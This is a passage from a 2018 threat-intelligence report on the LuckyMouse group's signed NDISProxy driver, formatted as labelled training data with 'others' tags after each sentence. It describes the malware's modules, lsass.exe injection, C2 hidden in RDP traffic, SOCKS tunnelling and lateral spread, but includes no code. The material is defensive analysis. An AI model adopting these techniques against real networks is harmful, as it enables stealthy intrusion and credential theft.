LuckyMouse signs malicious NDISProxy driver with certificate of Chinese IT company .		others others others others others others others others others others others others
Release_Time :  2018-09-10 .		others others others others
Report_URL :  https://securelist.com/luckymouse-ndisproxy-driver/87914/ .		others others others others others others
Since March 2018 we have discovered several infections where a previously unknown Trojan was injected into the lsass.exe system process memory .\ These implants were injected by the digitally signed 32- and 64-bit network filtering driver NDISProxy .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Interestingly , this driver is signed with a digital certificate that belongs to Chinese company LeagSoft , a developer of information security software based in Shenzhen , Guangdong .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
We informed the company about the issue via CN-CERT .		others others others others others others others others others others
The campaign described in this report was active immediately prior to Central Asian high-level meeting and we suppose that actor behind still follows regional political agenda .		others others others others others others others others others others others others others others others others others others others others others others others others others others others
The malware consists of three different modules :  A custom C++ installer that decrypts and drops the driver file in the corresponding system directory , creates a Windows autorun service for driver persistence and adds the encrypted in-memory Trojan to the system registry .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
A network filtering driver ( NDISProxy ) that decrypts and injects the Trojan into memory and filters port 3389 ( Remote Desktop Protocol , RDP ) traffic in order to insert the Trojan ’s C2 communications into it .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
A last-stage C++ Trojan acting as HTTPS server that works together with the driver .		others others others others others others others others others others others others others others others
It waits passively for communications from its C2 , with two possible communication channels via ports 3389 and 443 .		others others others others others others others others others others others others others others others others others others others others
These modules allow attackers to silently move laterally in the infected infrastructure , but don’t allow them to communicate with an external C2 if the new infected host only has a LAN IP .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Because of this , the operators used an Earthworm SOCKS tunneler in order to connect the LAN of the infected host to the external C2 .		others others others others others others others others others others others others others others others others others others others others others others others others others others
They also used the Scanline network scanner to find file shares ( port 135 , Server Message Block , SMB ) which they use to spread malware with administrative passwords , compromised with keyloggers .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
We assess with high confidence that NDISProxy is a new tool used by LuckyMouse .		others others others others others others others others others others others others others others others
Kaspersky Lab products detect the described artefacts .		others others others others others others others others
For more information please contact : intelreports@kaspersky.com .		others others others others others others others others others others
We detected the distribution of the 32-bit dropper used for this campaign among different targets by the end of March 2018 .		others others others others others others others others others others others others others others others others others others others others others others
